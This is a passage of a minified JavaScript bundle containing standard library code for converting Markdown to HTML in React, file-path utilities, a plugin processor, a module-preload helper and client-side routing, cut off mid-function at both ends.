Fc={blockquote:ac,break:oc,code:sc,delete:cc,emphasis:lc,footnoteReference:uc,heading:dc,html:fc,imageReference:mc,image:hc,inlineCode:gc,linkReference:_c,link:vc,listItem:yc,list:Sc,paragraph:Cc,root:wc,strong:Tc,table:Ec,tableCell:Oc,tableRow:Dc,text:Nc,thematicBreak:Pc,toml:Ic,yaml:Ic,definition:Ic,footnoteDefinition:Ic};function Ic(){}var Lc=typeof self==`object`?self:globalThis,Rc=(e,t)=>{switch(e){case`Function`:case`SharedWorker`:case`Worker`:case`eval`:case`setInterval`:case`setTimeout`:throw TypeError(`unable to deserialize `+e)}return new Lc[e](t)},zc=(e,t)=>{let n=(t,n)=>(e.set(n,t),t),r=i=>{if(e.has(i))return e.get(i);let[a,o]=t[i];switch(a){case 0:case-1:return n(o,i);case 1:{let e=n([],i);for(let t of o)e.push(r(t));return e}case 2:{let e=n({},i);for(let[t,n]of o)e[r(t)]=r(n);return e}case 3:return n(new Date(o),i);case 4:{let{source:e,flags:t}=o;return n(new RegExp(e,t),i)}case 5:{let e=n(new Map,i);for(let[t,n]of o)e.set(r(t),r(n));return e}case 6:{let e=n(new Set,i);for(let t of o)e.add(r(t));return e}case 7:{let{name:e,message:t}=o;return n(typeof Lc[e]==`function`?Rc(e,t):Error(t),i)}case 8:return n(BigInt(o),i);case`BigInt`:return n(Object(BigInt(o)),i);case`ArrayBuffer`:return n(new Uint8Array(o).buffer,o);case`DataView`:{let{buffer:e}=new Uint8Array(o);return n(new DataView(e),o)}}return n(Rc(a,o),i)};return r},Bc=e=>zc(new Map,e)(0),Vc=``,{toString:Hc}={},{keys:Uc}=Object,Wc=e=>{let t=typeof e;if(t!==`object`||!e)return[0,t];let n=Hc.call(e).slice(8,-1);switch(n){case`Array`:return[1,Vc];case`Object`:return[2,Vc];case`Date`:return[3,Vc];case`RegExp`:return[4,Vc];case`Map`:return[5,Vc];case`Set`:return[6,Vc];case`DataView`:return[1,n]}return n.includes(`Array`)?[1,n]:e instanceof Error?[7,e.name||`Error`]:[2,n]},Gc=([e,t])=>e===0&&(t===`function`||t===`symbol`),Kc=(e,t,n,r)=>{let i=(e,t)=>{let i=r.push(e)-1;return n.set(t,i),i},a=r=>{if(n.has(r))return n.get(r);let[o,s]=Wc(r);switch(o){case 0:{let t=r;switch(s){case`bigint`:o=8,t=r.toString();break;case`function`:case`symbol`:if(e)throw TypeError(`unable to serialize `+s);t=null;break;case`undefined`:return i([-1],r)}return i([o,t],r)}case 1:{if(s){let e=r;return s===`DataView`?e=new Uint8Array(r.buffer):s===`ArrayBuffer`&&(e=new Uint8Array(r)),i([s,[...e]],r)}let e=[],t=i([o,e],r);for(let t of r)e.push(a(t));return t}case 2:{if(s)switch(s){case`BigInt`:return i([s,r.toString()],r);case`Boolean`:case`Number`:case`String`:return i([s,r.valueOf()],r)}if(t&&`toJSON`in r)return a(r.toJSON());let n=[],c=i([o,n],r);for(let t of Uc(r))(e||!Gc(Wc(r[t])))&&n.push([a(t),a(r[t])]);return c}case 3:return i([o,isNaN(r.getTime())?Vc:r.toISOString()],r);case 4:{let{source:e,flags:t}=r;return i([o,{source:e,flags:t}],r)}case 5:{let t=[],n=i([o,t],r);for(let[n,i]of r)(e||!(Gc(Wc(n))||Gc(Wc(i))))&&t.push([a(n),a(i)]);return n}case 6:{let t=[],n=i([o,t],r);for(let n of r)(e||!Gc(Wc(n)))&&t.push(a(n));return n}}let{message:c}=r;return i([o,{name:s,message:c}],r)};return a},qc=(e,{json:t,lossy:n}={})=>{let r=[];return Kc(!(t||n),!!t,new Map,r)(e),r},Jc=typeof structuredClone==`function`?(e,t)=>t&&(`json`in t||`lossy`in t)?Bc(qc(e,t)):structuredClone(e):(e,t)=>Bc(qc(e,t));function Yc(e,t){let n=[{type:`text`,value:`↩`}];return t>1&&n.push({type:`element`,tagName:`sup`,properties:{},children:[{type:`text`,value:String(t)}]}),n}function Xc(e,t){return`Back to reference `+(e+1)+(t>1?`-`+t:``)}function Zc(e){let t=typeof e.options.clobberPrefix==`string`?e.options.clobberPrefix:`user-content-`,n=e.options.footnoteBackContent||Yc,r=e.options.footnoteBackLabel||Xc,i=e.options.footnoteLabel||`Footnotes`,a=e.options.footnoteLabelTagName||`h2`,o=e.options.footnoteLabelProperties||{className:[`sr-only`]},s=[],c=-1;for(;++c<e.footnoteOrder.length;){let i=e.footnoteById.get(e.footnoteOrder[c]);if(!i)continue;let a=e.all(i),o=String(i.identifier).toUpperCase(),l=zr(o.toLowerCase()),u=0,d=[],f=e.footnoteCounts.get(o);for(;f!==void 0&&++u<=f;){d.length>0&&d.push({type:`text`,value:` `});let e=typeof n==`string`?n:n(c,u);typeof e==`string`&&(e={type:`text`,value:e}),d.push({type:`element`,tagName:`a`,properties:{href:`#`+t+`fnref-`+l+(u>1?`-`+u:``),dataFootnoteBackref:``,ariaLabel:typeof r==`string`?r:r(c,u),className:[`data-footnote-backref`]},children:Array.isArray(e)?e:[e]})}let p=a[a.length-1];if(p&&p.type===`element`&&p.tagName===`p`){let e=p.children[p.children.length-1];e&&e.type===`text`?e.value+=` `:p.children.push({type:`text`,value:` `}),p.children.push(...d)}else a.push(...d);let m={type:`element`,tagName:`li`,properties:{id:t+`fn-`+l},children:e.wrap(a,!0)};e.patch(i,m),s.push(m)}if(s.length!==0)return{type:`element`,tagName:`section`,properties:{dataFootnotes:!0,className:[`footnotes`]},children:[{type:`element`,tagName:a,properties:{...Jc(o),id:`footnote-label`},children:[{type:`text`,value:i}]},{type:`text`,value:`
`},{type:`element`,tagName:`ol`,properties:{},children:e.wrap(s,!0)},{type:`text`,value:`
`}]}}var Qc={}.hasOwnProperty,$c={};function el(e,t){let n=t||$c,r=new Map,i=new Map,a={all:s,applyData:nl,definitionById:r,footnoteById:i,footnoteCounts:new Map,footnoteOrder:[],handlers:{...Fc,...n.handlers},one:o,options:n,patch:tl,wrap:il};return nn(e,function(e){if(e.type===`definition`||e.type===`footnoteDefinition`){let t=e.type===`definition`?r:i,n=String(e.identifier).toUpperCase();t.has(n)||t.set(n,e)}}),a;function o(e,t){let n=e.type,r=a.handlers[n];if(Qc.call(a.handlers,n)&&r)return r(a,e,t);if(a.options.passThrough&&a.options.passThrough.includes(n)){if(`children`in e){let{children:t,...n}=e,r=Jc(n);return r.children=a.all(e),r}return Jc(e)}return(a.options.unknownHandler||rl)(a,e,t)}function s(e){let t=[];if(`children`in e){let n=e.children,r=-1;for(;++r<n.length;){let i=a.one(n[r],e);if(i){if(r&&n[r-1].type===`break`&&(!Array.isArray(i)&&i.type===`text`&&(i.value=al(i.value)),!Array.isArray(i)&&i.type===`element`)){let e=i.children[0];e&&e.type===`text`&&(e.value=al(e.value))}Array.isArray(i)?t.push(...i):t.push(i)}}}return t}}function tl(e,t){e.position&&(t.position=Ro(e))}function nl(e,t){let n=t;if(e&&e.data){let t=e.data.hName,r=e.data.hChildren,i=e.data.hProperties;typeof t==`string`&&(n.type===`element`?n.tagName=t:n={type:`element`,tagName:t,properties:{},children:`children`in n?n.children:[n]}),n.type===`element`&&i&&Object.assign(n.properties,Jc(i)),`children`in n&&n.children&&r!=null&&(n.children=r)}return n}function rl(e,t){let n=t.data||{},r=`value`in t&&!(Qc.call(n,`hProperties`)||Qc.call(n,`hChildren`))?{type:`text`,value:t.value}:{type:`element`,tagName:`div`,properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function il(e,t){let n=[],r=-1;for(t&&n.push({type:`text`,value:`
`});++r<e.length;)r&&n.push({type:`text`,value:`
`}),n.push(e[r]);return t&&e.length>0&&n.push({type:`text`,value:`
`}),n}function al(e){let t=0,n=e.charCodeAt(t);for(;n===9||n===32;)t++,n=e.charCodeAt(t);return e.slice(t)}function ol(e,t){let n=el(e,t),r=n.one(e,void 0),i=Zc(n),a=Array.isArray(r)?{type:`root`,children:r}:r||{type:`root`,children:[]};return i&&(`children`in a,a.children.push({type:`text`,value:`
`},i)),a}function sl(e,t){return e&&`run`in e?async function(n,r){let i=ol(n,{file:r,...t});await e.run(i,r)}:function(n,r){return ol(n,{file:r,...e||t})}}function cl(e){if(e)throw e}var ll=o(((e,t)=>{var n=Object.prototype.hasOwnProperty,r=Object.prototype.toString,i=Object.defineProperty,a=Object.getOwnPropertyDescriptor,o=function(e){return typeof Array.isArray==`function`?Array.isArray(e):r.call(e)===`[object Array]`},s=function(e){if(!e||r.call(e)!==`[object Object]`)return!1;var t=n.call(e,`constructor`),i=e.constructor&&e.constructor.prototype&&n.call(e.constructor.prototype,`isPrototypeOf`);if(e.constructor&&!t&&!i)return!1;for(var a in e);return a===void 0||n.call(e,a)},c=function(e,t){i&&t.name===`__proto__`?i(e,t.name,{enumerable:!0,configurable:!0,value:t.newValue,writable:!0}):e[t.name]=t.newValue},l=function(e,t){if(t===`__proto__`){if(!n.call(e,t))return;if(a)return a(e,t).value}return e[t]};t.exports=function e(){var t,n,r,i,a,u,d=arguments[0],f=1,p=arguments.length,m=!1;for(typeof d==`boolean`&&(m=d,d=arguments[1]||{},f=2),(d==null||typeof d!=`object`&&typeof d!=`function`)&&(d={});f<p;++f)if(t=arguments[f],t!=null)for(n in t)r=l(d,n),i=l(t,n),d!==i&&(m&&i&&(s(i)||(a=o(i)))?(a?(a=!1,u=r&&o(r)?r:[]):u=r&&s(r)?r:{},c(d,{name:n,newValue:e(m,u,i)})):i!==void 0&&c(d,{name:n,newValue:i}));return d}}));function ul(e){if(typeof e!=`object`||!e)return!1;let t=Object.getPrototypeOf(e);return(t===null||t===Object.prototype||Object.getPrototypeOf(t)===null)&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)}function dl(){let e=[],t={run:n,use:r};return t;function n(...t){let n=-1,r=t.pop();if(typeof r!=`function`)throw TypeError(`Expected function as last argument, not `+r);i(null,...t);function i(a,...o){let s=e[++n],c=-1;if(a){r(a);return}for(;++c<t.length;)(o[c]===null||o[c]===void 0)&&(o[c]=t[c]);t=o,s?fl(s,i)(...o):r(null,...o)}}function r(n){if(typeof n!=`function`)throw TypeError("Expected `middelware` to be a function, not "+n);return e.push(n),t}}function fl(e,t){let n;return r;function r(...t){let r=e.length>t.length,o;r&&t.push(i);try{o=e.apply(this,t)}catch(e){let t=e;if(r&&n)throw t;return i(t)}r||(o&&o.then&&typeof o.then==`function`?o.then(a,i):o instanceof Error?i(o):a(o))}function i(e,...r){n||(n=!0,t(e,...r))}function a(e){i(null,e)}}var pl={basename:ml,dirname:hl,extname:gl,join:_l,sep:`/`};function ml(e,t){if(t!==void 0&&typeof t!=`string`)throw TypeError(`"ext" argument must be a string`);bl(e);let n=0,r=-1,i=e.length,a;if(t===void 0||t.length===0||t.length>e.length){for(;i--;)if(e.codePointAt(i)===47){if(a){n=i+1;break}}else r<0&&(a=!0,r=i+1);return r<0?``:e.slice(n,r)}if(t===e)return``;let o=-1,s=t.length-1;for(;i--;)if(e.codePointAt(i)===47){if(a){n=i+1;break}}else o<0&&(a=!0,o=i+1),s>-1&&(e.codePointAt(i)===t.codePointAt(s--)?s<0&&(r=i):(s=-1,r=o));return n===r?r=o:r<0&&(r=e.length),e.slice(n,r)}function hl(e){if(bl(e),e.length===0)return`.`;let t=-1,n=e.length,r;for(;--n;)if(e.codePointAt(n)===47){if(r){t=n;break}}else r||=!0;return t<0?e.codePointAt(0)===47?`/`:`.`:t===1&&e.codePointAt(0)===47?`//`:e.slice(0,t)}function gl(e){bl(e);let t=e.length,n=-1,r=0,i=-1,a=0,o;for(;t--;){let s=e.codePointAt(t);if(s===47){if(o){r=t+1;break}continue}n<0&&(o=!0,n=t+1),s===46?i<0?i=t:a!==1&&(a=1):i>-1&&(a=-1)}return i<0||n<0||a===0||a===1&&i===n-1&&i===r+1?``:e.slice(i,n)}function _l(...e){let t=-1,n;for(;++t<e.length;)bl(e[t]),e[t]&&(n=n===void 0?e[t]:n+`/`+e[t]);return n===void 0?`.`:vl(n)}function vl(e){bl(e);let t=e.codePointAt(0)===47,n=yl(e,!t);return n.length===0&&!t&&(n=`.`),n.length>0&&e.codePointAt(e.length-1)===47&&(n+=`/`),t?`/`+n:n}function yl(e,t){let n=``,r=0,i=-1,a=0,o=-1,s,c;for(;++o<=e.length;){if(o<e.length)s=e.codePointAt(o);else if(s===47)break;else s=47;if(s===47){if(i!==o-1&&a!==1){if(i!==o-1&&a===2){if(n.length<2||r!==2||n.codePointAt(n.length-1)!==46||n.codePointAt(n.length-2)!==46){if(n.length>2){if(c=n.lastIndexOf(`/`),c!==n.length-1){c<0?(n=``,r=0):(n=n.slice(0,c),r=n.length-1-n.lastIndexOf(`/`)),i=o,a=0;continue}}else if(n.length>0){n=``,r=0,i=o,a=0;continue}}t&&(n=n.length>0?n+`/..`:`..`,r=2)}else n.length>0?n+=`/`+e.slice(i+1,o):n=e.slice(i+1,o),r=o-i-1}i=o,a=0}else s===46&&a>-1?a++:a=-1}return n}function bl(e){if(typeof e!=`string`)throw TypeError(`Path must be a string. Received `+JSON.stringify(e))}var xl={cwd:Sl};function Sl(){return`/`}function Cl(e){return!!(typeof e==`object`&&e&&`href`in e&&e.href&&`protocol`in e&&e.protocol&&e.auth===void 0)}function wl(e){if(typeof e==`string`)e=new URL(e);else if(!Cl(e)){let t=TypeError('The "path" argument must be of type string or an instance of URL. Received `'+e+"`");throw t.code=`ERR_INVALID_ARG_TYPE`,t}if(e.protocol!==`file:`){let e=TypeError(`The URL must be of scheme file`);throw e.code=`ERR_INVALID_URL_SCHEME`,e}return Tl(e)}function Tl(e){if(e.hostname!==``){let e=TypeError(`File URL host must be "localhost" or empty on darwin`);throw e.code=`ERR_INVALID_FILE_URL_HOST`,e}let t=e.pathname,n=-1;for(;++n<t.length;)if(t.codePointAt(n)===37&&t.codePointAt(n+1)===50){let e=t.codePointAt(n+2);if(e===70||e===102){let e=TypeError(`File URL path must not include encoded / characters`);throw e.code=`ERR_INVALID_FILE_URL_PATH`,e}}return decodeURIComponent(t)}var El=[`history`,`path`,`basename`,`stem`,`extname`,`dirname`],Dl=class{constructor(e){let t;t=e?Cl(e)?{path:e}:typeof e==`string`||jl(e)?{value:e}:e:{},this.cwd=`cwd`in t?``:xl.cwd(),this.data={},this.history=[],this.messages=[],this.value,this.map,this.result,this.stored;let n=-1;for(;++n<El.length;){let e=El[n];e in t&&t[e]!==void 0&&t[e]!==null&&(this[e]=e===`history`?[...t[e]]:t[e])}let r;for(r in t)El.includes(r)||(this[r]=t[r])}get basename(){return typeof this.path==`string`?pl.basename(this.path):void 0}set basename(e){kl(e,`basename`),Ol(e,`basename`),this.path=pl.join(this.dirname||``,e)}get dirname(){return typeof this.path==`string`?pl.dirname(this.path):void 0}set dirname(e){Al(this.basename,`dirname`),this.path=pl.join(e||``,this.basename)}get extname(){return typeof this.path==`string`?pl.extname(this.path):void 0}set extname(e){if(Ol(e,`extname`),Al(this.dirname,`extname`),e){if(e.codePointAt(0)!==46)throw Error("`extname` must start with `.`");if(e.includes(`.`,1))throw Error("`extname` cannot contain multiple dots")}this.path=pl.join(this.dirname,this.stem+(e||``))}get path(){return this.history[this.history.length-1]}set path(e){Cl(e)&&(e=wl(e)),kl(e,`path`),this.path!==e&&this.history.push(e)}get stem(){return typeof this.path==`string`?pl.basename(this.path,this.extname):void 0}set stem(e){kl(e,`stem`),Ol(e,`stem`),this.path=pl.join(this.dirname||``,e+(this.extname||``))}fail(e,t,n){let r=this.message(e,t,n);throw r.fatal=!0,r}info(e,t,n){let r=this.message(e,t,n);return r.fatal=void 0,r}message(e,t,n){let r=new Uo(e,t,n);return this.path&&(r.name=this.path+`:`+r.name,r.file=this.path),r.fatal=!1,this.messages.push(r),r}toString(e){return this.value===void 0?``:typeof this.value==`string`?this.value:new TextDecoder(e||void 0).decode(this.value)}};function Ol(e,t){if(e&&e.includes(pl.sep))throw Error("`"+t+"` cannot be a path: did not expect `"+pl.sep+"`")}function kl(e,t){if(!e)throw Error("`"+t+"` cannot be empty")}function Al(e,t){if(!e)throw Error("Setting `"+t+"` requires `path` to be set too")}function jl(e){return!!(e&&typeof e==`object`&&`byteLength`in e&&`byteOffset`in e)}var Ml=(function(e){let t=this.constructor.prototype,n=t[e],r=function(){return n.apply(r,arguments)};return Object.setPrototypeOf(r,t),r}),Nl=l(ll(),1),Pl={}.hasOwnProperty,Fl=new class e extends Ml{constructor(){super(`copy`),this.Compiler=void 0,this.Parser=void 0,this.attachers=[],this.compiler=void 0,this.freezeIndex=-1,this.frozen=void 0,this.namespace={},this.parser=void 0,this.transformers=dl()}copy(){let t=new e,n=-1;for(;++n<this.attachers.length;){let e=this.attachers[n];t.use(...e)}return t.data((0,Nl.default)(!0,{},this.namespace)),t}data(e,t){return typeof e==`string`?arguments.length===2?(Rl(`data`,this.frozen),this.namespace[e]=t,this):Pl.call(this.namespace,e)&&this.namespace[e]||void 0:e?(Rl(`data`,this.frozen),this.namespace=e,this):this.namespace}freeze(){if(this.frozen)return this;let e=this;for(;++this.freezeIndex<this.attachers.length;){let[t,...n]=this.attachers[this.freezeIndex];if(n[0]===!1)continue;n[0]===!0&&(n[0]=void 0);let r=t.call(e,...n);typeof r==`function`&&this.transformers.use(r)}return this.frozen=!0,this.freezeIndex=1/0,this}parse(e){this.freeze();let t=W(e),n=this.parser||this.Parser;return Il(`parse`,n),n(String(t),t)}process(e,t){let n=this;return this.freeze(),Il(`process`,this.parser||this.Parser),Ll(`process`,this.compiler||this.Compiler),t?r(void 0,t):new Promise(r);function r(r,i){let a=W(e),o=n.parse(a);n.run(o,a,function(e,t,r){if(e||!t||!r)return s(e);let i=t,a=n.stringify(i,r);K(a)?r.value=a:r.result=a,s(e,r)});function s(e,n){e||!n?i(e):r?r(n):t(void 0,n)}}}processSync(e){let t=!1,n;return this.freeze(),Il(`processSync`,this.parser||this.Parser),Ll(`processSync`,this.compiler||this.Compiler),this.process(e,r),Bl(`processSync`,`process`,t),n;function r(e,r){t=!0,cl(e),n=r}}run(e,t,n){zl(e),this.freeze();let r=this.transformers;return!n&&typeof t==`function`&&(n=t,t=void 0),n?i(void 0,n):new Promise(i);function i(i,a){let o=W(t);r.run(e,o,s);function s(t,r,o){let s=r||e;t?a(t):i?i(s):n(void 0,s,o)}}}runSync(e,t){let n=!1,r;return this.run(e,t,i),Bl(`runSync`,`run`,n),r;function i(e,t){cl(e),r=t,n=!0}}stringify(e,t){this.freeze();let n=W(t),r=this.compiler||this.Compiler;return Ll(`stringify`,r),zl(e),r(e,n)}use(e,...t){let n=this.attachers,r=this.namespace;if(Rl(`use`,this.frozen),e!=null){if(typeof e==`function`)s(e,t);else if(typeof e==`object`)Array.isArray(e)?o(e):a(e);else throw TypeError("Expected usable value, not `"+e+"`")}return this;function i(e){if(typeof e==`function`)s(e,[]);else if(typeof e==`object`){if(Array.isArray(e)){let[t,...n]=e;s(t,n)}else a(e)}else throw TypeError("Expected usable value, not `"+e+"`")}function a(e){if(!(`plugins`in e)&&!(`settings`in e))throw Error("Expected usable value but received an empty preset, which is probably a mistake: presets typically come with `plugins` and sometimes with `settings`, but this has neither");o(e.plugins),e.settings&&(r.settings=(0,Nl.default)(!0,r.settings,e.settings))}function o(e){let t=-1;if(e!=null){if(Array.isArray(e))for(;++t<e.length;){let n=e[t];i(n)}else throw TypeError("Expected a list of plugins, not `"+e+"`")}}function s(e,t){let r=-1,i=-1;for(;++r<n.length;)if(n[r][0]===e){i=r;break}if(i===-1)n.push([e,...t]);else if(t.length>0){let[r,...a]=t,o=n[i][1];ul(o)&&ul(r)&&(r=(0,Nl.default)(!0,o,r)),n[i]=[e,r,...a]}}}}().freeze();function Il(e,t){if(typeof t!=`function`)throw TypeError("Cannot `"+e+"` without `parser`")}function Ll(e,t){if(typeof t!=`function`)throw TypeError("Cannot `"+e+"` without `compiler`")}function Rl(e,t){if(t)throw Error("Cannot call `"+e+"` on a frozen processor.\nCreate a new processor first, by calling it: use `processor()` instead of `processor`.")}function zl(e){if(!ul(e)||typeof e.type!=`string`)throw TypeError("Expected node, got `"+e+"`")}function Bl(e,t,n){if(!n)throw Error("`"+e+"` finished async. Use `"+t+"` instead")}function W(e){return G(e)?e:new Dl(e)}function G(e){return!!(e&&typeof e==`object`&&`message`in e&&`messages`in e)}function K(e){return typeof e==`string`||q(e)}function q(e){return!!(e&&typeof e==`object`&&`byteLength`in e&&`byteOffset`in e)}var J=[],Vl={allowDangerousHtml:!0},Hl=/^(https?|ircs?|mailto|xmpp)$/i,Ul=[{from:`astPlugins`,id:`remove-buggy-html-in-markdown-parser`},{from:`allowDangerousHtml`,id:`remove-buggy-html-in-markdown-parser`},{from:`allowNode`,id:`replace-allownode-allowedtypes-and-disallowedtypes`,to:`allowElement`},{from:`allowedTypes`,id:`replace-allownode-allowedtypes-and-disallowedtypes`,to:`allowedElements`},{from:`className`,id:`remove-classname`},{from:`disallowedTypes`,id:`replace-allownode-allowedtypes-and-disallowedtypes`,to:`disallowedElements`},{from:`escapeHtml`,id:`remove-buggy-html-in-markdown-parser`},{from:`includeElementIndex`,id:`#remove-includeelementindex`},{from:`includeNodeIndex`,id:`change-includenodeindex-to-includeelementindex`},{from:`linkTarget`,id:`remove-linktarget`},{from:`plugins`,id:`change-plugins-to-remarkplugins`,to:`remarkPlugins`},{from:`rawSourcePos`,id:`#remove-rawsourcepos`},{from:`renderers`,id:`change-renderers-to-components`,to:`components`},{from:`source`,id:`change-source-to-children`,to:`children`},{from:`sourcePos`,id:`#remove-sourcepos`},{from:`transformImageUri`,id:`#add-urltransform`,to:`urlTransform`},{from:`transformLinkUri`,id:`#add-urltransform`,to:`urlTransform`}];function Wl(e){let t=Gl(e),n=Kl(e);return ql(t.runSync(t.parse(n),n),e)}function Gl(e){let t=e.rehypePlugins||J,n=e.remarkPlugins||J,r=e.remarkRehypeOptions?{...e.remarkRehypeOptions,...Vl}:Vl;return Fl().use(ic).use(n).use(sl,r).use(t)}function Kl(e){let t=e.children||``,n=new Dl;return typeof t==`string`?n.value=t:``+t,n}function ql(e,t){let n=t.allowedElements,r=t.allowElement,i=t.components,a=t.disallowedElements,o=t.skipHtml,s=t.unwrapDisallowed,c=t.urlTransform||Jl;for(let e of Ul)Object.hasOwn(t,e.from)&&``+e.from+(e.to?"use `"+e.to+"` instead":`remove it`)+e.id;return nn(e,l),Zo(e,{Fragment:x.Fragment,components:i,ignoreInvalidStyle:!0,jsx:x.jsx,jsxs:x.jsxs,passKeys:!0,passNode:!0});function l(e,t,i){if(e.type===`raw`&&i&&typeof t==`number`)return o?i.children.splice(t,1):i.children[t]={type:`text`,value:e.value},t;if(e.type===`element`){let t;for(t in ys)if(Object.hasOwn(ys,t)&&Object.hasOwn(e.properties,t)){let n=e.properties[t],r=ys[t];(r===null||r.includes(e.tagName))&&(e.properties[t]=c(String(n||``),t,e))}}if(e.type===`element`){let o=n?!n.includes(e.tagName):a?a.includes(e.tagName):!1;if(!o&&r&&typeof t==`number`&&(o=!r(e,t,i)),o&&i&&typeof t==`number`)return s&&e.children?i.children.splice(t,1,...e.children):i.children.splice(t,1),t}}}function Jl(e){let t=e.indexOf(`:`),n=e.indexOf(`?`),r=e.indexOf(`#`),i=e.indexOf(`/`);return t===-1||i!==-1&&t>i||n!==-1&&t>n||r!==-1&&t>r||Hl.test(e.slice(0,t))?e:``}var Yl=`modulepreload`,Xl=function(e){return`/`+e},Zl={},Ql=function(e,t,n){let r=Promise.resolve();if(t&&t.length>0){let e=document.getElementsByTagName(`link`),i=document.querySelector(`meta[property=csp-nonce]`),a=i?.nonce||i?.getAttribute(`nonce`);function o(e){return Promise.all(e.map(e=>Promise.resolve(e).then(e=>({status:`fulfilled`,value:e}),e=>({status:`rejected`,reason:e}))))}function s(e){return import.meta.resolve?import.meta.resolve(e):new URL(e,import.meta.url).href}r=o(t.map(t=>{if(t=Xl(t,n),t=s(t),t in Zl)return;Zl[t]=!0;let r=t.endsWith(`.css`);for(let n=e.length-1;n>=0;n--){let i=e[n];if(i.href===t&&(!r||i.rel===`stylesheet`))return}let i=document.createElement(`link`);if(i.rel=r?`stylesheet`:Yl,r||(i.as=`script`),i.crossOrigin=``,i.href=t,a&&i.setAttribute(`nonce`,a),document.head.appendChild(i),r)return new Promise((e,n)=>{i.addEventListener(`load`,e),i.addEventListener(`error`,()=>n(Error(`Unable to preload CSS for ${t}`)))})}))}function i(e){let t=new Event(`vite:preloadError`,{cancelable:!0});if(t.payload=e,window.dispatchEvent(t),!t.defaultPrevented)throw e}return r.then(t=>{for(let e of t||[])e.status===`rejected`&&i(e.reason);return e().catch(i)})},$l=/^(?:[a-z][a-z0-9+.-]*:|[\\/]{2})/i,eu=/^[\\/]{2}/;function tu(e,t){return t+e.replace(/\\/g,`/`)}var nu=`popstate`;function ru(e){return typeof e==`object`&&!!e&&`pathname`in e&&`search`in e&&`hash`in e&&`state`in e&&`key`in e}function iu(e={}){function t(e,t){let n=t.state?.masked,{pathname:r,search:i,hash:a}=n||e.location;return su(``,{pathname:r,search:i,hash:a},t.state&&t.state.usr||null,t.state&&t.state.key||`default`,n?{pathname:e.location.pathname,search:e.location.search,hash:e.location.hash}:void 0)}function n(e,t){return typeof t==`string`?t:cu(t)}return uu(t,n,null,e)}function Y(e,t){if(e===!1||e==null)throw Error(t)}function X(e,t){if(!e){typeof console<`u`&&console.warn(t);try{throw Error(t)}catch{}}}function au(){return Math.random().toString(36).substring(2,10)}function ou(e,t){return{usr:e.state,key:e.key,idx:t,masked:e.mask?{pathname:e.pathname,search:e.search,hash:e.hash}:void 0}}function su(e,t,n=null,r,i){return{pathname:typeof e==`string`?e:e.pathname,search:``,hash:``,...typeof t==`string`?lu(t):t,state:n,key:t&&t.key||r||au(),mask:i}}function cu({pathname:e=`/`,search:t=``,hash:n=``}){return t&&t!==`?`&&(e+=t.charAt(0)===`?`?t:`?`+t),n&&n!==`#`&&(e+=n.charAt(0)===`#`?n:`#`+n),e}function lu(e){let t={};if(e){let n=e.indexOf(`#`);n>=0&&(t.hash=e.substring(n),e=e.substring(0,n));let r=e.indexOf(`?`);r>=0&&(t.search=e.substring(r),e=e.substring(0,r)),e&&(t.pathname=e)}return t}function uu(e,t,n,r={}){let{window:i=document.defaultView,v5Compat:a=!1}=r,o=i.history,s=`POP`,c=null,l=u();l??(l=0,o.replaceState({...o.state,idx:l},``));function u(){return(o.state||{idx:null}).idx}function d(){s=`POP`;let e=u(),t=e==null?null:e-l;l=e,c&&c({action:s,location:h.location,delta:t})}function f(e,t){s=`PUSH`;let r=ru(e)?e:su(h.location,e,t);n&&n(r,e),l=u()+1;let d=ou(r,l),f=h.createHref(r.mask||r);try{o.pushState(d,``,f)}catch(e){if(e instanceof DOMException&&e.name===`DataCloneError`)throw e;i.location.assign(f)}a&&c&&c({action:s,location:h.location,delta:1})}function p(e,t){s=`REPLACE`;let r=ru(e)?e:su(h.location,e,t);n&&n(r,e),l=u();let i=ou(r,l),d=h.createHref(r.mask||r);o.replaceState(i,``,d),a&&c&&c({action:s,location:h.location,delta:0})}function m(e){return du(i,e)}let h={get action(){return s},get location(){return e(i,o)},listen(e){if(c)throw Error(`A history only accepts one active listener`);return i.addEventListener(nu,d),c=e,()=>{i.removeEventListener(nu,d),c=null}},createHref(e){return t(i,e)},createURL:m,encodeLocation(e){let t=m(e);return{pathname:t.pathname,search:t.search,hash:t.hash}},push:f,replace:p,go(e){return o.go(e)}};return h}function du(e,t,n=!1){let r=`http://localhost`;e&&(r=e.location.origin===`null`?e.location.href:e.location.origin),Y(r,`No window.location.(origin|href) available to create URL`);let i=typeof t==`string`?t:cu(t);return i=i.replace(/ $/,`%20`),!n&&eu.test(i)&&(i=r+i),new URL(i,r)}function fu(e,t,n=`/`){return pu(e,t,n,!1)}function pu(e,t,n,r,i){let a=Mu((typeof t==`string`?lu(t):t).pathname||`/`,n);if(a==null)return null;let o=i??mu(e),s=null,c=ju(a);for(let e=0;s==null&&e<o.length;++e)s=Du(o[e],c,r);return s}function mu(e){let t=hu(e);return _u(t),t}function hu(e,t=[],n=[],r=``,i=!1){let a=(e,a,o=i,s)=>{let c={relativePath:s===void 0?e.path||``:s,caseSensitive:e.caseSensitive===!0,childrenIndex:a,route:e};if(c.relativePath.startsWith(`/`)){if(!c.relativePath.startsWith(r)&&o)return;Y(c.relativePath.startsWith(r),`Absolute route path "${c.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),c.relativePath=c.relativePath.slice(r.length)}let l=Bu([r,c.relativePath]),u=n.concat(c);e.children&&e.children.length>0&&(Y(e.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${l}".`),hu(e.children,t,u,l,o)),!(e.path==null&&!e.index)&&t.push({path:l,score:Tu(l,e.index),routesMeta:u.map((e,t)=>{let[n,r]=Au(e.relativePath,e.caseSensitive,t===u.length-1);return{...e,matcher:n,compiledParams:r}})})};return e.forEach((e,t)=>{if(e.path===``||!e.path?.includes(`?`))a(e,t);else for(let n of gu(e.path))a(e,t,!0,n)}),t}function gu(e){let t=e.split(`/`);if(t.length===0)return[];let[n,...r]=t,i=n.endsWith(`?`),a=n.replace(/\?$/,``);if(r.length===0)return i?[a,``]:[a];let o=gu(r.join(`/`)),s=[];return s.push(...o.map(e=>e===``?a:[a,e].join(`/`))),i&&s.push(...o),s.map(t=>e.startsWith(`/`)&&t===``?`/`:t)}function _u(e){e.sort((e,t)=>e.score===t.score?Eu(e.routesMeta.map(e=>e.childrenIndex),t.routesMeta.map(e=>e.childrenIndex)):t.score-e.score)}var vu=/^:[\w-]+$/,yu=3,bu=2,xu=1,Su=10,Cu=-2,wu=e=>e===`*`;function Tu(e,t){let n=e.split(`/`),r=n.length;return 